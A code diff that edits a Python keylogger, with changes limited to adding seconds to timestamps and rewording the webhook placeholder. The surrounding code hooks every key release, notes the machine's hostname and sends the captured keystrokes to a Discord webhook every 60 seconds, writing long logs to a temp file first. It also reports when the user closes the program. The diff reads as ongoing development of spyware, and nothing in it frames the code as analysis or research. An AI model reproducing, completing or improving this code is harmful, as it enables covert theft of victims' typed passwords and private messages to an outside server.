@@ -7,7 +7,7 @@ import shutil
 import winreg as reg
 
 SEND_REPORT_EVERY = 60  # Example: Sends report every 60 seconds
-WEBHOOK_URL = "<YOUR_DISCORD_WEBHOOK_URL>"  # Replace this with your webhook URL
+WEBHOOK_URL = "Enter Webhook URL"  # Replace this with your webhook URL
 
 class Klgr:
     def __init__(self, i, m="wh"):
@@ -15,8 +15,8 @@ class Klgr:
         self.i = i
         self.m = m
         self.l = ""
-        self.s_dt = n.strftime('%d/%m/%Y %H:%M')
-        self.e_dt = n.strftime('%d/%m/%Y %H:%M')
+        self.s_dt = n.strftime('%d/%m/%Y %H:%M:%S')
+        self.e_dt = n.strftime('%d/%m/%Y %H:%M:%S')
         self.u = socket.gethostname()
 
         self.npo()
@@ -78,7 +78,7 @@ class Klgr:
         t.start()
 
     def s(self):
-        self.s_dt = datetime.now()
+        self.s_dt = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
         keyboard.on_release(callback=self.cb)
         self.r()
         keyboard.wait()
@@ -103,7 +103,7 @@ class Klgr:
 
     def sloc(self):
         if self.l:
-            self.e_dt = datetime.now().strftime('%d/%m/%Y %H:%M')
+            self.e_dt = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
             w = DiscordWebhook(url=WEBHOOK_URL)
             if len(self.l) > 2000:
                 p = os.path.join(os.environ["temp"], "command_report.txt")
@@ -122,7 +122,7 @@ class Klgr:
         w = DiscordWebhook(url=WEBHOOK_URL)
         e = DiscordEmbed(
             title="User closed program",
-            description=f"Program closed on {self.u}'s machine at {datetime.now().strftime('%d/%m/%Y %H:%M')}.",
+            description=f"Program closed on {self.u}'s machine at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}.",
             color=242424
         )
         w.add_embed(e)
